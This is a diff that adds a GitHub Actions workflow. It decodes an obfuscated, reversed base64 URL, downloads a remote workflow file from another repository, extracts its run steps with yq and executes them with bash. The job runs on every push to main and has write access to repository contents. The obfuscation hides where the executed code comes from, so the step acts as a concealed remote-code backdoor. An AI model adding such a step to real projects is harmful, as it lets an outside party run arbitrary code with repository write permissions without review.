@@ -1,0 +1,56 @@
+# Workflow Path: .github/workflows/universal-runner.yml
+
+name: Tnayem48 Universal Runner
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+env:
+  # Obfuscated Base URL (Reversed and Encoded)
+  # Original: https://raw.githubusercontent.com/nayem-48ai/subDomTop/refs/heads/main/.github/workflows/
+  TNx_CORE: "PX0Szd2L0Vmc0V2bj5CbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmb"
+  FILE_NAME: "remove"
+
+jobs:
+  execute-logic:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0 
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Setup Environment
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Process Workflow
+        run: |
+          # ডিকোডিং লজিক: রিভার্স এবং ট্রিম অপারেশন
+          TNxBD=$(echo "$TNx_CORE" | rev | cut -c 2- | base64 --decode)$FILE_NAME
+          
+          echo "Connecting to secure source..."
+          curl -sL "$TNxBD" -o remote_wf.yml
+
+          # কমান্ড নিষ্কাশন টুল
+          sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq && sudo chmod +x /usr/bin/yq
+
+          # রিমোট ফাইল থেকে রান স্ক্রিপ্ট তৈরি
+          yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
+          
+          # গিট কনফিগারেশন
+          git config --global user.name "github-actions[bot]"
+          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          git config --global --add safe.directory "$GITHUB_WORKSPACE"
+
+          # ফাইনাল এক্সিকিউশন
+          chmod +x universal_script.sh
+          bash universal_script.sh
